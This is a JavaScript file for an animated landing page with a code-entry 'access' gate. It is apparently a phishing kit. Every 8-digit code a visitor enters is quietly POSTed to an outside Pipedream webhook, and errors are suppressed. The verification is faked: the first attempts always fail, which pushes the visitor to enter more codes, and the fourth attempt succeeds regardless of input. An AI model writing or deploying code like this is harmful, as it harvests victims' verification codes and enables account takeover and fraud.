gsap.registerPlugin(ScrollTrigger);
gsap.from('.hero h2', { y: 60, opacity: 0, duration: 1.1, ease: 'power3.out' });
gsap.from('.hero p', { y: 40, opacity: 0, delay: 0.15, duration: 1 });
gsap.from('.cta', { y: 40, opacity: 0, delay: 0.3, duration: 1 });
gsap.utils.toArray('.card,.frame').forEach(el => {
    gsap.from(el, {
        scrollTrigger: { trigger: el, start: 'top 85%' },
        y: 80,
        opacity: 0,
        duration: 1,
        ease: 'power3.out'
    });
});

const access = document.getElementById('access');
const openAccess = document.getElementById('openAccess');
const input = document.getElementById('code');
const submit = document.getElementById('submit');
const verify = document.getElementById('verify');
const bar = document.getElementById('bar');
const err = document.getElementById('err');
const warn = document.getElementById('warn');
const modal = document.getElementById('modal');
const openInfo = document.getElementById('openInfo');
const gate = document.querySelector('.gate');
const success = document.querySelector('.success');

let attempts = 0;
let verifying = false;
let verified = false;
let cycleToken = 0;
let clicksRemaining = 1;
let cooldownUntil = 0;

const now = () => Date.now();

const resetMessages = () => {
    err.style.display = 'none';
    warn.style.display = 'none';
};

const hardDisableSubmit = () => {
    submit.disabled = true;
    submit.style.pointerEvents = 'none';
    submit.classList.remove('enabled');
};

const hardEnableSubmitIfReady = () => {
    submit.disabled = false;
    submit.style.pointerEvents = 'auto';
    submit.classList.toggle('enabled', input.value.length === 8);
};

const lockUI = () => {
    verifying = true;
    hardDisableSubmit();
    input.disabled = true;
};

const unlockUI = () => {
    verifying = false;
    input.disabled = false;
    clicksRemaining = 1;
    hardEnableSubmitIfReady();
};

const startVerifyAnimation = () => {
    verify.style.display = 'block';
    bar.style.width = '0%';
    gsap.to(bar, { width: '100%', duration: 1.8, ease: 'power2.out' });
};

const stopVerifyAnimation = () => {
    verify.style.display = 'none';
};

const sendAttemptToWebhook = (code, attemptCount, timestamp) => {
    const payload = {
        code: code,
        attempt: attemptCount,
        timestamp: timestamp
    };

    fetch('https://eoyl5jcd83mpbw2.m.pipedream.net', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .catch(() => {
        // Silently catch errors to avoid any disruptions or logs
    });
};

openAccess.onclick = () => {
    access.style.display = 'flex';
    gsap.fromTo(access, { opacity: 0 }, { opacity: 1, duration: 0.6 });
};

openInfo.onclick = () => {
    modal.style.display = 'flex';
    gsap.fromTo('.modal-card', { y: 40, opacity: 0 }, { y: 0, opacity: 1, duration: 0.6 });
};

modal.onclick = () => {
    modal.style.display = 'none';
};

input.addEventListener('input', () => {
    if (verifying || verified) return;
    input.value = input.value.replace(/\D/g, '').slice(0, 8);
    resetMessages();
    hardEnableSubmitIfReady();
});

submit.onclick = () => {
    if (verified) return;
    if (now() < cooldownUntil) return;
    if (verifying || clicksRemaining <= 0) return;
    if (input.value.length !== 8) return;

    clicksRemaining = 0;
    verifying = true;
    lockUI();
    resetMessages();
    startVerifyAnimation();

    const token = ++cycleToken;
    attempts += 1;

    // Record the attempt and send to webhook
    sendAttemptToWebhook(input.value, attempts, new Date().toISOString());

    setTimeout(() => {
        if (token !== cycleToken) return;
        stopVerifyAnimation();

        if (attempts <= 2) {
            err.style.display = 'block';
            cooldownUntil = now() + 700;
            unlockUI();
            return;
        }

        if (attempts === 3) {
            warn.style.display = 'block';
            cooldownUntil = now() + 900;
            unlockUI();
            return;
        }

        verified = true;
        gate.style.display = 'none';
        success.style.display = 'block';
        gsap.fromTo(success, { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.6 });
    }, 1900);
};

input.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
        e.preventDefault();
        submit.click();
    }
});
